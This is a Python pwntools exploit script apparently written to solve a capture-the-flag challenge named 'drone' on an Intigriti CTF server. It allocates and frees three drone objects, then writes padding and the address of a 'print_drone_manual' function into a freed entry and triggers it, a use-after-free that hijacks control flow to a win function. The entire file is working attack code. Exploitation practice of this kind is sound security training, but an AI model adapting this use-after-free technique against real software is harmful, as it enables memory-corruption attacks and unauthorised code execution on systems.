#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './drone' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'uap.ctf.intigriti.io', 1340 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
'''
 ---------------------------------
| Symphonie der Entschlossenheit  |
 ---------------------------------
'''

def deploy():
    # sleep(0.5)
    # io.sendlineafter(b'option:', b'1')
    io.sendline(b'1')
    
def retire(id):
    io.sendline(b'2')
    # io.sendlineafter(b'option:', b'2')
    io.sendlineafter(b':', f'{id}'.encode())

def start(id):
    io.sendline(b'3')
    # io.sendlineafter(b'option:', b'3')
    io.sendlineafter(b':', f'{id}'.encode())
    
def enter(id, data):
    # io.sendlineafter(b'option:', b'4')
    io.sendline(b'4')
    io.sendlineafter(b':', f'{id}'.encode())
    io.sendlineafter(b':', data)
    

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    win = elf.sym['print_drone_manual']
    
    deploy() # 1
    deploy() # 2
    deploy() # 3
    
    retire(1)
    retire(2)
    retire(3)
    
    payload = b'A' * 16
    payload += p64(win)
    enter(2, payload)
    
    start(2)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()